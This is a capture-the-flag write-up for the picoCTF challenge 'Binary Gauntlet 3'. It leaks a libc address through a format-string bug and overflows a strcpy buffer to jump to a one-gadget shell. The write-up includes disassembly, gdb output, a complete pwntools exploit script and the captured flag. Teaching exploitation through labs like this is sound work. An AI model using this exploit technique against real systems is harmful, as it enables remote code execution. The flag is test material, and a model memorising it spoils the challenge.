# Binary Gauntlet 3 : Binary Exploitation

The stack is no longer executable. The flag for this challenge does not include the standard picoCTF{} wrapper.  
[gauntlet](gauntlet) [libc-2.27.so](libc-2.27.so) `nc -v wily-courier.picoctf.net 52732`

Author : madStacks

# Solution

For now, try executing it.
```
$ nc -v wily-courier.picoctf.net 52732
Connection to wily-courier.picoctf.net (18.189.99.27) 52732 port [tcp/*] succeeded!
%p
0x198be260
```
Check the file gauntlet.
```
$ file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=222b0b66300f70a1574255b3eba98098bf792e37, not stripped

$ checksec gauntlet
[*] '/home/colza/gauntlet'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
Chekck the assembly langugage of `main` function.
```
0000000000400687 <main>:
  400687:       55                      push   rbp
  400688:       48 89 e5                mov    rbp,rsp
  40068b:       48 83 c4 80             add    rsp,0xffffffffffffff80
  40068f:       89 7d 8c                mov    DWORD PTR [rbp-0x74],edi
  400692:       48 89 75 80             mov    QWORD PTR [rbp-0x80],rsi
  400696:       bf e8 03 00 00          mov    edi,0x3e8
  40069b:       e8 e0 fe ff ff          call   400580 <malloc@plt>
  4006a0:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  4006a4:       48 8b 15 b5 09 20 00    mov    rdx,QWORD PTR [rip+0x2009b5]        # 601060 <stdin@GLIBC_2.2.5>
  4006ab:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4006af:       be e8 03 00 00          mov    esi,0x3e8
  4006b4:       48 89 c7                mov    rdi,rax
  4006b7:       e8 b4 fe ff ff          call   400570 <fgets@plt>
  4006bc:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4006c0:       48 05 e7 03 00 00       add    rax,0x3e7
  4006c6:       c6 00 00                mov    BYTE PTR [rax],0x0
  4006c9:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4006cd:       48 89 c7                mov    rdi,rax
  4006d0:       b8 00 00 00 00          mov    eax,0x0
  4006d5:       e8 86 fe ff ff          call   400560 <printf@plt>
  4006da:       48 8b 05 6f 09 20 00    mov    rax,QWORD PTR [rip+0x20096f]        # 601050 <stdout@GLIBC_2.2.5>
  4006e1:       48 89 c7                mov    rdi,rax
  4006e4:       e8 a7 fe ff ff          call   400590 <fflush@plt>
  4006e9:       48 8b 15 70 09 20 00    mov    rdx,QWORD PTR [rip+0x200970]        # 601060 <stdin@GLIBC_2.2.5>
  4006f0:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4006f4:       be e8 03 00 00          mov    esi,0x3e8
  4006f9:       48 89 c7                mov    rdi,rax
  4006fc:       e8 6f fe ff ff          call   400570 <fgets@plt>
  400701:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  400705:       48 05 e7 03 00 00       add    rax,0x3e7
  40070b:       c6 00 00                mov    BYTE PTR [rax],0x0
  40070e:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
  400712:       48 8d 45 90             lea    rax,[rbp-0x70]
  400716:       48 89 d6                mov    rsi,rdx
  400719:       48 89 c7                mov    rdi,rax
  40071c:       e8 2f fe ff ff          call   400550 <strcpy@plt>
  400721:       b8 00 00 00 00          mov    eax,0x0
  400726:       c9                      leave
  400727:       c3                      ret
  400728:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  40072f:       00
```
After leaking libc using FSB, we want to do ROP, but since the BOF is triggered by `strcpy`, we are looking for a one gadget.
The offset when triggering the BOF is 120 bytes.

First, leak libc.

Calculate the offset from the stack top to the address of libc function by using gdb.
```
$ gdb gauntlet
pwndbg> b *main+78
Breakpoint 1 at 0x4006d5
pwndbg> r
%6$p
pwndbg> ni
0x7fffffffdd18
pwndbg> tele 18
00:0000│ rsp 0x7fffffffdb80 —▸ 0x7fffffffdd18 —▸ 0x7fffffffdfd2 ◂— '/home/colza/gauntlet'
01:0008│-078 0x7fffffffdb88 ◂— 0x100000001
02:0010│-070 0x7fffffffdb90 ◂— 1
03:0018│-068 0x7fffffffdb98 ◂— 1
04:0020│-060 0x7fffffffdba0 —▸ 0x400040 ◂— 0x400000006
05:0028│-058 0x7fffffffdba8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
06:0030│-050 0x7fffffffdbb0 ◂— 0x6f0
07:0038│-048 0x7fffffffdbb8 —▸ 0x7fffffffdfb9 ◂— 0xc5cbbd69c21f40ea
08:0040│-040 0x7fffffffdbc0 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
09:0048│-038 0x7fffffffdbc8 ◂— 0x10101000000
0a:0050│-030 0x7fffffffdbd0 ◂— 2
0b:0058│-028 0x7fffffffdbd8 ◂— 0x1f8bfbff
0c:0060│-020 0x7fffffffdbe0 —▸ 0x7fffffffdfc9 ◂— 0x34365f363878 /* 'x86_64' */
0d:0068│-018 0x7fffffffdbe8 ◂— 0x64 /* 'd' */
0e:0070│-010 0x7fffffffdbf0 ◂— 0x1000
0f:0078│-008 0x7fffffffdbf8 —▸ 0x6022a0 ◂— 0xa70243625 /* '%6$p\n' */
10:0080│ rbp 0x7fffffffdc00 ◂— 1
11:0088│+008 0x7fffffffdc08 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
```
There is the address of `__libc_start_call_main+128` on the stack. So the offset is `18 + 5 = 23`.

However, the `__libc_start_call_main` function does not exist before libc2.34, and since the libc used this time is 2.27, we can assume that in the remote environment this address corresponds to some address within the `__libc_start_main` function.

Since ASLR is not enabled, we can first use `%23$p` to print an address somewhere within the `__libc_start_main` function, and then calculate the difference in the lower three nibbles which is the relative address of `__libc_start_main` and that to determine exactly which address inside the function it is.
```
$ nc -v wily-courier.picoctf.net 52732
Connection to wily-courier.picoctf.net (18.189.99.27) 52732 port [tcp/*] succeeded!
%23$p
0x798f6c4d9c87

$ nm -D libc-2.27.so | grep __libc_start
0000000000021ba0 T __libc_start_main@@GLIBC_2.2.5
```
The difference is `0xc87 - 0xba0 = 0xe7`.  
By subtracting the relative address of the `__libc_start_main` function and `0xe7` from the leaked address, we can obtain the libc base address.

Next, look for a one gadget.
```
$ one_gadget libc-2.27.so
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
This time, use the one gadget at `0x4f302`.

Execution code below:
```python solve.py
from pwn import *

libc = ELF('./libc-2.27.so')

p = remote('wily-courier.picoctf.net', 52732)

libc_start_main_addr = libc.symbols['__libc_start_main']

p.sendline(b"%23$p")

libc.address = int(p.recvline().strip(), 16) - libc_start_main_addr - 0xe7
log.info(hex(libc.address))

one_gadget = libc.address + 0x4f302

payload = b"a" * 120 + p64(one_gadget)

p.sendline(payload)

p.interactive()
```

Execute it.
```
$ python3 solve.py
[*] '/home/colza/gauntlet'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[*] '/home/colza/libc-2.27.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to wily-courier.picoctf.net on port 52732: Done
[*] 0x72a28bf70000
[*] Switching to interactive mode
$ ls
Dockerfile
Makefile
Solution
flag.txt
gauntlet
gauntlet.c
libc-2.27.so
start.sh
$ cat flag.txt
922f936b9911812111eb648e30917b7c
```

Got the flag!

`922f936b9911812111eb648e30917b7c`
